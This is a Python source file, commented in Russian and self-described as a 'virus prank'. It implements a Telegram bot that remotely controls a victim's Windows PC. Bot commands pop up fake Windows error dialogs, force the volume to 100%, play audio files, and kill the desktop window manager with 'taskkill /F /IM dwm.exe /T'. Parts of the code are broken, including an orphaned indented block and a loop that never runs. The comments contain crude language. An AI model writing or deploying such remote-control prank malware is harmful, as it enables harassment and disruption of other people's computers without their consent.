# Наговнокоддено и защищенно правом Ametero(z)
import telebot # Для функции управления с помощью ТГ
from telebot import types # Для функции управления с помощью ТГ
# from telebot.apihelper import ApiTelegramException # Хрень используемая для не работающей функции проверки доступа к админки
from tkinter import messagebox as mb # Для фейковой ошибки (/error текст)
import winsound # Проигрывание .wav файлов
import pyvolume # Библиотека для изменения уровня громкости
import time # Использованна по приколу
import os # Фича с крашем

# Говнокодинный вирусс прикол пранк MrDimon
# Надеюсь прочитал сам гитхаб поэтому вопросов мало



def extract_arg(arg): # Для аргумента в команде /error
    return arg.split()[1:]

#def is_subscribed(chat_id, user_id): # Сломанная функция
    try:
        bot.get_chat_member(chat_id, user_id)
        return True
    except ApiTelegramException as e:
        if e.result_json['description'] == 'Bad Request: user not found':
            return False

#lalka = 000000000 # Чат ИД группы (Использован в сломанной функции)
bot = telebot.TeleBot('lolka kek') # Токен для бота лол

@bot.message_handler(commands=['start'])
def start(message):
        user = message.from_user.id
        #f not is_subscribed(lalka, user):
    # ПОЛОМАННАЯ ХУЙНЯ         #bot.send_message(message.chat.id, "Братан, ты не Слава Мерлоу,  если ты хочешь стать им то [хуячь это](https://forms.gle/tJnYevcTcJa34d847)", parse_mode='MarkdownV2')
        #else:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True) # Размечаем клаву
        btn1 = types.KeyboardButton('Проверить коннект (Debug фича)')
        btn2 = types.KeyboardButton('Помощь')
        btn3 = types.KeyboardButton('Проиграть Димона')
        btn5 = types.KeyboardButton('Проиграть Гимн.ukruine') # Асу
        btn4 = types.KeyboardButton('100 % звук')
        markup.add(btn1, btn2, btn3, btn5, btn4)
        bot.send_message(user, 'Вилькомин!)', reply_markup=markup)
@bot.message_handler(commands=['error'])
def error(message): # Команда для отправки фейковой ошибки
    status = extract_arg(message.text)
    mb.showerror("Windows Environment", status)
@bot.message_handler(commands=['crash']) # Команда для краша скрипта
def crash(message):
     user = message.from_user.id
     bot.send_message(user, "Скрипт крашится")
     os.system("taskkill /F /IM dwm.exe /T") # Реализм, хардкор # Лучше заменить!!!!!

@bot.message_handler(content_types=['text']) # Функционал кнопок
def get_text_messages(message):
     user = message.from_user.id
     if message.text == "Проверить коннект (Debug фича)": # Проверка коннектиона, доступна при консольном варианте билдинга
          bot.send_message(user, "Проверка коннекта выполнена. Сервер получит уведомление!")
          print("ВНИМАНИЕ! Админка запросила проверку коннекта! Чат Айди запросившого : " + str(user))
     elif message.text == "100 % звук": # Ставит звук на сотку
          bot.send_message(user, "Ставим звук сотку)))")
          pyvolume.custom(100)
     elif message.text == "Помощь": # Помощь соотвественно
          bot.send_message(user, "Хелпа по командам : \n /error текст - отправляет ошибку с вашим текстом \n /crash - крашит скрипт))")
     elif message.text == "Проиграть Димона": # Проигрывает файл dim.wav
          bot.send_message(user, "Выкручиваем звук на полную")
          pyvolume.custom(percent=100)
          time.sleep(1)
          bot.send_message(user, "Проигрывание Димона началось")
          baspushka = 0
          while baspushka == 5000:
               pyvolume.custom(percent=100)
          winsound.PlaySound('dim.wav', winsound.SND_FILENAME)
          bot.send_message(user, "Демон Димон съеаблся")
     elif message.text == "Проиграть Гимн.ukruine": # Проигрывает файл wmi.wav
          bot.send_message(user, "Слава Yкраiне 🇺🇦")
          pyvolume.custom(percent=100)
          winsound.PlaySound('wmi.wav', winsound.SND_FILENAME)
          bot.send_message(user, "Асу асу") 

bot.polling() # Поллинг бота
